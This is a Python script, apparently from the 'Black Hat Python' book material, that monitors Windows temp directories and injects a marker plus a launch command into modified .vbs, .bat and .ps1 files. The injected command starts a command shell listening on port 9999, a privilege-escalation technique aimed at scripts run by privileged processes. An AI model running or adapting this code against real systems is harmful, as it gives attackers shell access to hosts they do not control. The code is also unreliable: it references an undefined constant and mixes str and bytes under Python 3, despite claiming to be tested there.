'''
	Tested on python3
	About	: File Moitor
	pre-req : pywin32 wmi(http://sourceforge.net/projects/pywin32/)
			  common set of vulnerabilities(http://www.nostarch.com/blackhatpython/ http://www.nostarch.com/blackhatpython/)
'''

import tempfile
import threading
import win32file
import win32con
import os

#tmp file directory
monitor_temp_dir = ["C:\\WINDOWS\\Temp",tempfile.gettempdir()]

#constants
FILE_CREATED        = 1
FILE_DELETED        = 2
FILE_MODIFIED       = 3
FILE_RENAMED_FROM   = 4
FILE_RENAMED_TO     = 5
types_of_files	    = {}

command = "C:\\WINDOWS\\TEMP\\bhpnet.exe -l -p 9999 -c"
types_of_files['.vbs'] = ["\r\n'bhpmarker\r\n","\r\nCreateObject(\"Wscript.Shell\").Run(\"%s\")\r\n" % command]

types_of_files['.bat'] = ["\r\nREM bhpmarker\r\n","\r\n%s\r\n" % command]

types_of_files['.ps1'] = ["\r\n#bhpmarker","Start-Process \"%s\"\r\n" % command]

def inject_code(full_filename,extension,contents):
	#check if marker is ready
	if types_of_files[extension][0] in contents:
		return

	#if no marker
	full_contents   = types_of_files[extension][0]
	full_contents  += types_of_files[extension][1]
	full_contents  += contents

	with open(full_filename,"wb") as fd:
		fd.write(full_contents)

	print("[\o/] Injected code.")

	return

def start_monitor(path_to_watch):
	#thread
	FILE_LIST_DIRECTORY = 0x0001

	h_directory = win32file.CreateFile(
		 path_to_watch,
		FILE_LIST_DIRECTORY,
		win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
		None,
		win32con.OPEN_EXISTING,
		win32con.FILE_FLAG_BACKUP_SEMANTICS,
		None
	)

	while True:
		try:
			results = win32file.ReadDirectoryChangesW(
				h_directory,
				1024,
				True,
				win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
				win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
				win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
				win32con.FILE_NOTIFY_CHANGE_SIZE |
				win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
				win32con.FILE_NOTIFY_CHANGE_SECURITY,
				None,
				None
			)

			for action,file_name in results:
				full_filename = os.path.join(path_to_watch, file_name)

				if action == FILE_CREATED:
					print("Created %s" % full_filename)
				elif action == FILE_DELETED:
					print("Deleted %s" % full_filename)
				elif action == FILE_MODIFIED:
					print("Modified %s" % full_filename)

					print("Dumping contents...")

					try:
						with open(full_filename,"rb") as fd:
							contents = fd.read()

						print(contents)
						print("Dump conplete.")
					except Exception as e:
						print("Failed.")
						print(e)

					filename,extension = os.path.splitext(full_filename)

					if extension in types_of_files:
						inject_code(full_filename,extension,contents)

				elif action == FILE_RENAME_FROM:
					print("Renamed from: %s" % full_filename)
				elif action == FILE_RENAMED_TO:
					print("Renamed to: %s" % full_filename)
				else:
					print("Unknown: %s" % full_filename)

		except Exception as e:
			print(e)
for path in monitor_temp_dir:
	monitor_thread = threading.Thread(target=start_monitor,args=(path,))
	print("Spawning monitoring thread for path: %s" % path)
	monitor_thread.start()

#Reference: http://timgolden.me.uk/python/win32_how_do_i/watch_directory_for_changes.html